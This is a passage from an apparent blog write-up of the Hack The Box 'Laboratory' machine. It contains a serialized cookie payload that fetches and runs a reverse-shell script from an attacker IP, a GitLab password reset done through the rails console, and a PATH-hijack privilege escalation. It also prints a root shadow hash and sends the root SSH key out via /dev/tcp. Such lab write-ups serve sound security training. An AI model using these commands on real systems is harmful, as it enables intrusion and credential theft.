class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-k</code></span><span class="SemanticString"> option at the end to disable SSL checks:</span></span><div id="https://www.notion.so/90051d2e60da4ad3bb93f327135a51ca" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ curl -vvv &#x27;https://git.laboratory.htb/users/sign_in&#x27; -b &quot;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAYwjY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgd2dldCBodHRwOi8vMTAuMTAuMTQuMTAzOjkwOTAvcmV2ZXJzZS5zaCAmJiBjaG1vZCAreCByZXZlcnNlLnNoICYmIC4vcmV2ZXJzZS5zaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--db75c853cd72781d87505f46671012d391cfaccc&quot; -k</code></span></span></p></div></li><li id="https://www.notion.so/43f8e4a843c949d591c6729b75fae6fa" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We should get a shell as git, inside the GitLab docker container.</span></span></li><li id="https://www.notion.so/62c52289b39748fa917c4a2a295e4904" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">As the git user has write access to the GitLab system, we can change Dexter&#x27;s GitLab password using the gitlab-rails console:</span></span><div id="https://www.notion.so/63e71707399c48989ee53cdc8ba79988" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ gitlab-rails console</code></span></span></p></div><pre id="https://www.notion.so/21ee5f7ef82142349998a28bb596b9f5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>user <span class="token operator">=</span> <span class="token constant">User</span><span class="token punctuation">.</span>where<span class="token punctuation">(</span>id<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first
user<span class="token punctuation">.</span>password <span class="token operator">=</span> <span class="token string">'mango123!'</span>
user<span class="token punctuation">.</span>password_confirmation <span class="token operator">=</span> <span class="token string">'mango123!'</span>
user<span class="token punctuation">.</span>save<span class="token operator">!</span></span></span></span></code></pre></li><li id="https://www.notion.so/49e8a89d309e40c0beb60d12ebd1f8af" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Changed GitLab credentials:
</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dexter:mango123!</code></span></span></li><li id="https://www.notion.so/f3f8e6fedbf341dd82a77b20d0aa62d5" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Login to Dexter&#x27;s GitLab account, and we find his SSH keys are stored in the SecureDocker repository, under the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">./dexter/.ssh</code></span><span class="SemanticString"> directory.</span></span></li><li id="https://www.notion.so/daf24bc63b234fcba5423e2ad3ea4469" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Download the repository as a zip, and extract the contents.</span></span></li><li id="https://www.notion.so/bb3f81a99cdf461cafcf87bbf2b94831" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Before we SSH, we have to change the file permissions of id_rsa key to the appropriate values:</span></span><div id="https://www.notion.so/11394f09c50e43c2a06b0c27d55cd602" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ chmod 600 ./securedocker-master-dexter/dexter/.ssh/id_rsa</code></span></span></p></div></li><li id="https://www.notion.so/845516eab4b4495babe25fb6dc2bf844" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">SSH in as dexter:</span></span><div id="https://www.notion.so/772c0fda429b4d8b8fe1f2400649523a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ssh -i ./securedocker-master-dexter/dexter/.ssh/id_rsa dexter@10.10.10.216</code></span></span></p></div><pre id="https://www.notion.so/73623652e770429691a088723857e562" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Load key &quot;./securedocker-master-dexter/dexter/.ssh/id.rsa&quot;: invalid format
</span></span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="mailto:dexter@10.10.10.216"><span>dexter@10.10.10.216</span></a></span><span class="SemanticString"><span>: Permission denied (publickey).</span></span></span></code></pre></li><li id="https://www.notion.so/04300be17e5d4489a2d6d3ea22b898f5" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Strange, after a bit of searching, it seems like the GitLab </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">id_rsa</code></span><span class="SemanticString"> files tend to fail because of a missing line break at the EOF.</span></span></li><li id="https://www.notion.so/11facdc58a2d4326aeae0cacacb83202" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Retry after adding the line break:</span></span><div id="https://www.notion.so/c1b6da25e218450b8205153c119e6be2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami &amp;&amp; id</code></span></span></p></div><pre id="https://www.notion.so/3a02780a48cd4e6eac6c38c694c32ff1" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>dexter
uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)</span></span></span></code></pre></li><li id="https://www.notion.so/cf2df0ae9560499ab480f433527a5538" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get user flag!</span></span></li></ul><h2 id="https://www.notion.so/9ef0386457e1471495606e1199e54bf9" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/9ef0386457e1471495606e1199e54bf9"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/8a4b371e08b94973abd30d43e6d3113c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Along with the SSH keys, we also find a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">todo.txt</code></span><span class="SemanticString"> file under </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">./dexter/</code></span><span class="SemanticString"> of the SecureDocker repository:</span></span><pre id="https://www.notion.so/224933c11aca46099de7f3e278b165bc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span># DONE: Secure docker for regular users
### DONE: Automate docker security on startup
# TODO: Look into &quot;docker compose&quot;
# TODO: Permanently ban DeeDee from lab</span></span></span></code></pre></li><li id="https://www.notion.so/38aedd81b6b6416085d6f590145007cc" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We find out that there is a &quot;docker security&quot; module that&#x27;s scheduled to automatically trigger on start-up.</span></span></li><li id="https://www.notion.so/736d6672adcc44978663e21339a8252c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">If this module has privileged access and Dexter has write access to it, we can leverage this to execute arbitrary code as root.</span></span></li><li id="https://www.notion.so/d5529cd9e1e64777a8efe6b431ff8e79" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We also find out about another user called &quot;DeeDee&quot; (also mentioned on homepage) who has yet to be banned, perhaps he/she has unrevoked privileged access?</span></span></li><li id="https://www.notion.so/71cdc3fad05a4407a5708112c575d99c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Finding privileged files:</span></span><div id="https://www.notion.so/aa57f11232d5456da6ab29784dad5ece" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ file / -perm -4000 2&gt;/dev/null</code></span></span></p></div><pre id="https://www.notion.so/6494572ed9604003a124e8b32a931d21" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>/usr/local/bin/docker-security</span></span></span></code></pre></li><li id="https://www.notion.so/59b8b383f6e543f1a798fd1fd957dd28" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We have found our file of interest, looking deeper:</span></span><div id="https://www.notion.so/097333ee138a416c9ac0b947d159931b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">`$ stat /usr/local/bin/docker-security`</span></span></p></div><pre id="https://www.notion.so/643bcd62d31a4343a6fc4c8bd98f4a71" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>  File: /usr/local/bin/docker-security
  Size: 16720           Blocks: 40         IO Block: 4096   regular file
Device: fd00h/64768d    Inode: 7838        Links: 1
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: ( 1000/  dexter)
Access: 2021-01-22 05:26:56.593557861 +0000
Modify: 2020-08-28 14:52:07.000000000 +0000
Change: 2020-08-28 15:59:35.508011813 +0000
 Birth: -</span></span></span></code></pre></li><li id="https://www.notion.so/5fa0e2fcf5674b18b9145fbaa676db24" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Upon executing the binary, nothing outputs nor are any files created.</span></span></li><li id="https://www.notion.so/604b4ad355be455dbef18cfa835fc5c5" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We can debug it further using the Linux utility </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ltrace</code></span><span class="SemanticString">, which displays the calls a userspace application makes to other shared libraries:</span></span><div id="https://www.notion.so/5951b3c4250a4a149c6179d5593eff25" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ltrace ./docker-security</code></span></span></p></div><pre id="https://www.notion.so/9b7a4fec852b4092b2924e97c3409696" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>setuid(0)                                                           = -1
setgid(0)                                                           = -1
system(&quot;chmod 700 /usr/bin/docker&quot;chmod: changing permissions of &#x27;/usr/bin/docker&#x27;: Operation not permitted
 &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                              = 256
system(&quot;chmod 660 /var/run/docker.sock&quot;chmod: changing permissions of &#x27;/var/run/docker.sock&#x27;: Operation not permitted
 &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                              = 256
+++ exited (status 0) +++</span></span></span></code></pre></li><li id="https://www.notion.so/3209f5fa42b74a34bcbf31a346d9dcff" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We see that the binary first sets the UID and GID on execution to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">0</code></span><span class="SemanticString">, which is reserved for the root user and group.</span></span></li><li id="https://www.notion.so/f84363a0459e4e4c9c2f1a8bb4af0ce5" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">It then calls </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">chmod</code></span><span class="SemanticString">, a Linux utility for modifying file permissions, on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/usr/bin/docker</code></span><span class="SemanticString">, which seems to have failed.</span></span></li><li id="https://www.notion.so/64f0cfd2643c4798b4867255bfeaf134" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">However, by exploiting the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$PATH</code></span><span class="SemanticString"> variable and creating our own malicious version of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">chmod</code></span><span class="SemanticString">, we can leverage this binary call to have it execute arbitrary code as root.</span></span></li><li id="https://www.notion.so/46e2295335d44568b003e4823ae2456b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Create temporary directory:</span></span><div id="https://www.notion.so/b3482af4e3094c9f88b44a64b30819ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ mkdir /tmp/sup &amp;&amp; cd /tmp/sup</code></span></span></p></div></li><li id="https://www.notion.so/f02fe0db363f423982a98a7ec5ba3185" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Create bogus version of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">chmod</code></span><span class="SemanticString">, and make it executable:</span></span><div id="https://www.notion.so/16867387bea147628a2aaa4d24a2828a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ echo &quot;/bin/bash&quot; &gt; chmod</code></span></span></p></div><div id="https://www.notion.so/4230e6855c4241b79b98d09e10fd9459" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ chmod 777 ./chmod</code></span></span></p></div></li><li id="https://www.notion.so/5562067846b841a5902cbda79e44f9f9" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Prepend the current directory to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$PATH</code></span><span class="SemanticString">, such that the malicious version takes priority over the real </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">chmod</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/2bb16c592d0b4481957b1cedd7bab152" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ export PATH=/tmp/sup:$PATH</code></span></span></p></div></li><li id="https://www.notion.so/9c58732711fb4c818828ac78acf59197" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Execute the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">docker-security</code></span><span class="SemanticString"> binary again, and we now get a shell as the root user:</span></span><div id="https://www.notion.so/21c955c7ce8f4159b773b3825812b95b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami &amp;&amp; id</code></span></span></p></div><pre id="https://www.notion.so/e507454a53654da292aebf3ee94d709b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root
uid=0(root) gid=0(root) groups=0(root),1000(dexter)</span></span></span></code></pre></li><li id="https://www.notion.so/f07d2711635c41d49b8d3eb64887bf12" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root flag!</span></span></li></ul><h2 id="https://www.notion.so/5bbe1ef7a78f43a6902a18fbb7eb630c" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/5bbe1ef7a78f43a6902a18fbb7eb630c"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Persistence</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/4168002b6615412cb097f6507a0636f2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root user&#x27;s hash from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/shadow</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/657d45ce91ef45c29e17940e65a93921" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root:$6$AMvgOmRCNzBloX3T$rd5nRPwkBPHenf6VLHfsXb066LNq0MZBRYeEsuCZviD8nQGvVLMaW9iH1hb5FPHzdl.McOJ8GrFIFfdSnIo4t1:18439:0:99999:7:::</span></span></span></code></pre></li><li id="https://www.notion.so/a626f37e86f24ec8add68bd9859e4c3b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root user&#x27;s SSH key from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/root/.ssh/</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/9a4829689b33414c99d8398e12538e99" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nc -lvnp 6969 &gt; ./id_rsa &lt; /dev/null</code></span></span></p></div><div id="https://www.notion.so/6b77b37ef1a145678a28282ee789fac2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cat /root/.ssh/id_rsa &gt; /dev/tcp/10.10.14.103/6969</code></span></span></p></div></li></ul><h2 id="https://www.notion.so/f8f3ed05af5a45c98dc31ad2f5534bb5" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/f8f3ed05af5a45c98dc31ad2f5534bb5"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Resources</span></span></h2><ol class="NumberedListWrapper"><li id="https://www.notion.so/5ff64263e0464931a4cfa515bb062780" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://hackerone.com/reports/827052">https://hackerone.com/reports/827052</a></span></span></li><li id="https://www.notion.so/9575826822004a9199a28b3d3ce36456" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></span></span></li></ol></article>
  <footer class="Footer">
  <div>samiko@127.0.0.1~$</div>
  <div>&centerdot;</div>
  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank" rel="noopener noreferrer">Notablog</a>.</div>
</footer>
</body>

</html>